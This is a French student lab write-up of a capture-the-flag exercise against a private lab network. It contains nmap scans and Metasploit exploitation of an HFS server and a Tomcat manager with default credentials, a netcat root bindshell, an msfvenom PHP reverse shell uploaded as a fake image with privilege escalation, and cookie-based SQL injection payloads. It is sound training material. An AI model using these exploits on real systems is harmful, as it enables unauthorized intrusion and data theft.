# AST - Labo 1 & 2

**Auteurs : ** Gwendoline Dössegger & Cassandre Wojciechowski

**Date : ** 07.10.2020

-----

#### Summary Host discovery & flags: 

- **10.10.40.1**         *routeur*
- **10.10.40.13**	   *flag : AST16{Ping_or_no_ping_thats_the_question}*
- **10.10.40.85**	   *flag : AST16{m3745p1017_p0w3r_700_345y}*
- **10.10.40.122**	*flag : AST16{d3f4u17_cr3d5_3v3rywh3r3}*
- **10.10.40.128**	*flag : AST16{up104d_w17h_57y13_15_n07_3n0u6h}*
- **10.10.40.138**	*flag : EHK17{1a86ff7923c40c9ccd806ee5036d363c068ccc4d}*
- **10.10.40.168**	*flag : not found yet*
- **10.10.40.231**	*flag : not found yet*

## Scanning 

Dans un premier temps, nous avons recherché les différents postes actifs présents dans l'infrastructure à l'aide de la commande suivante :

``````shell
nmap -sn 10.10.40.0/24
``````

Ceci nous a permis de trouver l'ensemble des machines suivante :

``````
10.10.40.1		//Routeur
10.10.40.13
10.10.40.85
10.10.40.122
10.10.40.128
10.10.40.138
10.10.40.168
10.10.40.231
``````

Le routeur 10.10.40.1 n'est pas pris en compte pour les exploitations. Quant aux autres postes et pour chacun d'entres-eux, nous avons scanné l'ensemble des ports avec les commandes suivantes (selon les besoins) :

``````shell
nmap -p0-65535 10.10.40.X -v		//le x correspond au poste
nmap -sV --allport 10.10.40.x		
``````



## Exploitation

#### Host 10.10.40.13

Lors du scan de cette machine, nous avons pu constater qu'il y avait le port 80 ouvert et que le service http est activé dessus. On a donc essayé de se connecter avec un navigateur web. Sur la page web à l'adresse de la machine, on a pu y lire la version du serveur HTTP.

``````shell
nmap -Pn -p0-65535 10.10.40.13 -v

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-16 09:29 BST
Initiating Parallel DNS resolution of 1 host. at 09:29
Completed Parallel DNS resolution of 1 host. at 09:29, 0.00s elapsed
Initiating SYN Stealth Scan at 09:29
Scanning 10.10.40.13 [65536 ports]
Discovered open port 80/tcp on 10.10.40.13
SYN Stealth Scan Timing: About 18.11% done; ETC: 09:32 (0:02:20 remaining)
SYN Stealth Scan Timing: About 44.57% done; ETC: 09:31 (0:01:16 remaining)    
Completed SYN Stealth Scan at 09:31, 110.20s elapsed (65536 total ports)    
Nmap scan report for 10.10.40.13                               
Host is up (0.015s latency).                                   
Not shown: 65535 filtered ports                               
PORT   STATE SERVICE                                         
80/tcp open  http                                          
Read data files from: /usr/bin/../share/nmap            
Nmap done: 1 IP address (1 host up) scanned in 110.31 seconds    
Raw packets sent: 131153 (5.771MB) | Rcvd: 83 (3.652KB) 
``````

Le service correspond à un `HttpFileServer` en version `2.3`. Puis à l'aide de `search`, on a regardé les potentielles vulnérabilités pour ce service.

``````shell
#Recherche d'un exploit avec search
msf5 > search hfs

Matching Modules
================

   #  Name                                        Disclosure Date  Rank       Check  Description
   -  ----                                        ---------------  ----       -----  -----------
   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
   1  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
``````

Nous avons utilisé la vulnérabilité suivante pour effectuer un exploit :

``````shell
exploit/windows/http/rejetto_hfs_exec

#description du module
  Rejetto HttpFileServer (HFS) is vulnerable to remote command 
  execution attack due to a poor regex in the file ParserLib.pas. This 
  module exploits the HFS scripting commands by using '%00' to bypass 
  the filtering. This module has been tested successfully on HFS 2.3b 
  over Windows XP SP3, Windows 7 SP1 and Windows 8.
``````

Ensuite avec `msfconsole`, on a configuré et lancé l'exploit de la manière suivante :

``````shell
msfconsole
use exploit/windows/http/rejetto_hfs_exec		//choix du module
set rhost 10.10.40.13							//set l'adresse de la victime
show option 									//vérifier la configuration
exploit											//lancement de l'attaque
``````

Suite à l'exécution, on peut remarquer qu'on est sur la machine.

``````shell
sysinfo 										//vérifie sur quelle machine on est
getuid											//accès avec les privilèges Administrator
getsystem										//escalade de privilèges en système
ls												//affiche le contenu du répertoire
	
cat flag.txt									//affiche le contenu du fichier flag.txt
# AST16{Ping_or_no_ping_thats_the_question}
``````

> source : https://subscription.packtpub.com/book/networking_and_servers/9781786463166/1/ch01lvl1sec20/vulnerability-analysis-of-hfs-2-3



#### Host 10.10.40.85

``````shell
#Scan des ports avec 
nmap -sV -p0-65535 10.10.40.85

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-16 09:44 BST
Nmap scan report for 10.10.40.85
Host is up (0.019s latency).
Not shown: 65505 closed ports
PORT      STATE    SERVICE      VERSION
0/tcp     filtered unknown
21/tcp    open     ftp          vsftpd 2.3.4
22/tcp    open     ssh          OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp    open     telnet       Linux telnetd
25/tcp    open     smtp         Postfix smtpd
53/tcp    open     domain       ISC BIND 9.4.2
80/tcp    open     http         Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp   open     rpcbind      2 (RPC #100000)
139/tcp   open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp   open     exec         netkit-rsh rexecd
513/tcp   open     login?
514/tcp   open     shell        Netkit rshd
1099/tcp  open     rmiregistry?
1524/tcp  open     bindshell    Metasploitable root shell
2049/tcp  open     nfs          2-4 (RPC #100003)
2121/tcp  open     ftp          ProFTPD 1.3.1
3306/tcp  open     mysql        MySQL 5.0.51a-3ubuntu5
3632/tcp  open     distccd      distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp  open     postgresql   PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp  open     vnc          VNC (protocol 3.3)
6000/tcp  open     X11          (access denied)
6667/tcp  open     irc          UnrealIRCd
6697/tcp  open     irc          UnrealIRCd
8009/tcp  open     ajp13        Apache Jserv (Protocol v1.3)
8180/tcp  open     http         Apache Tomcat/Coyote JSP engine 1.1
8787/tcp  open     drb          Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
32991/tcp open     unknown
41276/tcp open     mountd       1-3 (RPC #100005)
41771/tcp open     status       1 (RPC #100024)
52984/tcp open     nlockmgr     1-4 (RPC #100021)
``````

Suite au scan des ports, on a découvert que sur le port 1524 de la machine il y avait un service nommé `Metasploitable Root Shell`. On s'y est donc connecté avec un `netcat`. 

``````shell
nc 10.10.40.85 1524
ls
# affichage des
#... fichiers (dont flag.txt)
#... dossiers

cat flag.txt
# AST16{m3745p1017_p0w3r_700_345y}*
``````

La connexion s'effectue sans problème et nous avons un `shell` fonctionnel sur la machine. Avec un `ls`, on a pu lister les fichiers et dossiers du répertoire courant. On a ensuite visualisé le fichier appelé `flag.txt` à l'aide de la commande suivante : `cat flag.txt`.

Le flag de cette machine est : `AST16{m3745p1017_p0w3r_700_345y}`



#### Host 10.10.40.122

````shell
#Scan des ports avec
nmap -sV -p0-65535 10.10.40.122

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-16 09:49 BST
Nmap scan report for 10.10.40.122
Host is up (0.016s latency).
Not shown: 65534 closed ports
PORT     STATE    SERVICE     VERSION
0/tcp    filtered unknown
8080/tcp open     http-proxy?
````

Sur cette machine, on peut voir qu'il y a uniquement le port 8080 qui est ouvert avec un service web derrière. On s'est donc connecté via l'URL suivante : `http://10.10.40.122:8080` et nous avons obtenu la page web de base du serveur web `Tomcat`. On a parcouru les différents liens de la page et avons constaté qu'il fallait des identifiants pour se connecter au `manager webapp`.

Pour nous y connecter, nous avons décidé de tester les mots de passe par défaut à l'aide d'un module de `metasploit`. Ce module test l'ensemble des identifiants par défaut présents dans la base de données de `metasploit` sur le formulaire de connexion du manager de Tomcat. 

````shell
msfconsole
use scanner/http/tomcat_mgr_login					#pour tester les id par défaut
set RHOST 10.10.40.122								#ip de la victime
run

#Identifiant trouvé user:password
tomcat:tomcat
````

On a ensuite cherché une autre vulnérabilité afin d'avoir accès aux fichiers sur le serveur en passant par exemple par un `shell`.  Grâce à `metasploit`, il est donc possible de le faire. Nous avons donc configuré un `payload` suivant :

````shell
msfconsole
use exploit/multi/http/tomcat_mgr_deploy
set HttpPassword tomcat
set HttpUsername tomcat
set RHOST 10.10.40.122
set RPORT 8080
set VHOST 10.10.40.122
run	
````

Après avoir lancé l'exploit, un `shell meterpreter` s'est ouvert et on a donc pu naviguer dans le système de fichiers. Avec les commandes suivantes, on a pu retrouver le flag : 

````shell
#Recherche du fichiers & navigation dans les répertoires
ls
cd ../../
ls

#Affichage des fichiers/dossiers
cat flag.txt
````

Le flag de cette machine est : ` AST16{d3f4u17_cr3d5_3v3rywh3r3}`

> Source : https://pentestlab.blog/2012/03/22/apache-tomcat-exploitation/



#### Host 10.10.40.128

````shell
#Scan des ports avec 
nmap -sV -p0-65535 10.10.40.128

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-16 09:55 BST
Nmap scan report for 10.10.40.128
Host is up (0.026s latency).
Not shown: 65534 closed ports
PORT   STATE    SERVICE VERSION
0/tcp  filtered unknown
80/tcp open     http    Apache httpd 2.2.11 ((Ubuntu) PHP/5.2.6-3ubuntu4 with Suhosin-Patch)
````

On peut voir qu'on a un serveur Apache qui tourne sur le port 80. Nous nous sommes donc connecté via un client web. Sur cette page, on a pu constater qu'il y a avait un formulaire pour upload une "image" sur le serveur. Nous sommes donc partie sur l'idée d'injecter un fichier contenant un shell. 

Pour créer un fichier contenant notre shell, nous avons utilisé `msfvenom`.

```shell
#Générer un shell dans un fichier php
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.42.12 LPORT=5555 -f raw -o shell.php
```

Puis à l'aide d'un script python, on a ajouté les entêtes png au fichier `shell.php` afin que celui-ci puisse être upload sur le serveur.

La prochaine étape consiste configurer `metasploit` pour pouvoir accéder au `shell upload` sur le serveur. 

```shell
#configuration pour accéder au shell
use exploit/multi/handler 
set LHOST 10.10.42.12
set LPORT 5555
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
```

Pour finaliser la connexion, il faut accéder à l'adresse du fichier php upload précédemment : http://10.10.40.128/uploads/4ff435f8ff59b14231f54cbe12bde851475b5bb4b156877e95ac4fb154849fb1_shell_modify.php

```shell
#mise en background de la session + regarder son ID
background
sessions 

#augmenter les privilèges
use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
set payload linux/x86/meterpreter_reverse_tcp
set LHOST 10.10.42.12
set LPORT 4500
set SESSION 3
exploit

#Vérifier qu'on est root
#Server username: uid=0, gid=0, euid=0, egid=0
getuid

#Avoir le flag
find / -name '*flag*'
```

Dans le dossier `/root`, on peut trouver le fichier `flag.txt`. Avec la commande `cat flag.txt`, on trouve le flag suivant : `AST16{up104d_w17h_57y13_15_n07_3n0u6h}`.

> source : https://www.youtube.com/watch?v=by-Z1EKwgTs



#### Host 10.10.40.138

````shell
#Scan des ports avec
nmap -sV -p0-65535 10.10.40.138 

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 14:50 BST
Nmap scan report for 10.10.40.138
Host is up (0.013s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
````

Avec le scan de port, on trouve le service `ssh` qui tourne sur le port 22 ainsi qu'un service `http` sur le port 80. Nous nous sommes donc connectées avec un navigateur web à l'URL suivante : `http://10.10.40.138`. On peut voir qu'il y a un formulaire de connexion. Ceci implique qu'il y a une base de données derrière et une attaque d'injection SQL est potentiellement possible.

Dans un premier temps, nous avons saisie l'injection suivante dans le champ username et password : `'password' OR 1=1'`. Lors de la connexion, nous avons eu le message d'erreur suivant : 

````
"You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'password' OR 1=1'" AND passw0rd='369e5c46184ae33e1e3701ef68bf11408653b8185575251' at line 1"
````

Puis lorsque l'on supprime le `cookie`, un message d'erreur indiquant que la valeur de `authenticator` n'est pas renseigné dans le `cookie`.

Nous avons donc recréé le `cookie` et l'avons modifié afin d'injecter nos requêtes SQL. Chaque requête SQL a été convertie en base64 avant l'envoi. 

``````mysql
#1. création d'un cookie
#Connexion avec un compte qu'on a créé (user = coucou)

#2. affiche tous les users 
coucou' OR '1' = '1'#

#3. affiche les tables et leur nom
'UNION SELECT table_schema, table_name, 1 FROM information_schema.tables#: 

#4. Recherche les columns sur la table s3cr3t
'UNION SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_name = 's3cr3t_t4ble'#:

#5. Affiche le contenu de la colone fl4g
'UNION SELECT fl4g, 1, 2 FROM s3cr3t_t4ble#:

#flag = EHK17{1a86ff7923c40c9ccd806ee5036d363c068ccc4d}
``````



#### Host 10.10.40.168

````shell
#Scan des ports avec
nmap -sV -p0-65535 10.10.40.168

tarting Nmap 7.80 ( https://nmap.org ) at 2020-10-07 16:50 BST
Nmap scan report for 10.10.40.168
Host is up (0.015s latency).
Not shown: 993 filtered ports
PORT      STATE SERVICE VERSION
53/tcp    open  domain  Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
80/tcp    open  http    Apache Tomcat/Coyote JSP engine 1.1
135/tcp   open  msrpc   Microsoft Windows RPC
8009/tcp  open  ajp13   Apache Jserv (Protocol v1.3)
49154/tcp open  msrpc   Microsoft Windows RPC
49155/tcp open  msrpc   Microsoft Windows RPC
49157/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows
````

Dans un premier temps, on est redirigé vers l'adresse `http://www.corporation-sa.com` . On peut voir que le DNS ne peut résoudre l'adresse. Ceci insinue que l'adresse est sur un DNS interne. Il faut donc modifier le fichier `/etc/hosts`.

```shell
host www.corporation-sa.com 10.10.40.168
vim /etc/hosts

#ajouter
10.10.40.168 www.corporation-sa.com
```









#### Host 10.10.40.231

Lors du scan des ports, on se retrouve avec la liste suivante :

``````shell
#Scan des ports avec
nmap -sV -p0-65535 10.10.40.231s

Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 14:52 BST
Initiating Ping Scan at 14:52
Scanning 10.10.40.231 [4 ports]
Completed Ping Scan at 14:52, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 14:52
Completed Parallel DNS resolution of 1 host. at 14:52, 0.00s elapsed
Initiating SYN Stealth Scan at 14:52
Scanning 10.10.40.231 [65536 ports]
Discovered open port 22/tcp on 10.10.40.231
Discovered open port 60001/tcp on 10.10.40.231
Completed SYN Stealth Scan at 14:52, 18.02s elapsed (65536 total ports)
Nmap scan report for 10.10.40.231
Host is up (0.015s latency).
Not shown: 65533 closed ports
PORT      STATE    SERVICE
0/tcp     filtered unknown
22/tcp    open     ssh
60001/tcp open     unknown
``````

Nous avons essayé de nous connecter via `nc` sur le port 60001. Nous avons donc eu la sortie suivante :

``````shell
>nc 10.10.40.231 60001

In case of problem, creds to the server are guest:guest

What do you want to do ?
1. Create a new note
2. Change the content of one of your notes
3. Get infos about your notes
4. Delete one of your notes
5. Exit the progra, this will delete all your notes
``````

On obtient donc les informations sur la connexion ssh d'un utilisation : `guest:guest`. On peut donc s'y connecter de la manière suivante :

`ssh guest@10.10.40.231` et comme mdp `guest`.

Dans le répertoire `/home/ast20/note_service/share`, on retrouve le binaire `chall` qui est l'application qui tourne sur le port `60001`. 



Etape manquante : reverse le fichier `chall`



------

##### Sources :

reverse shell : https://docs.j7k6.org/php-reverse-shell-metasploit/

augmenter les privilèges : https://www.youtube.com/watch?v=by-Z1EKwgTs

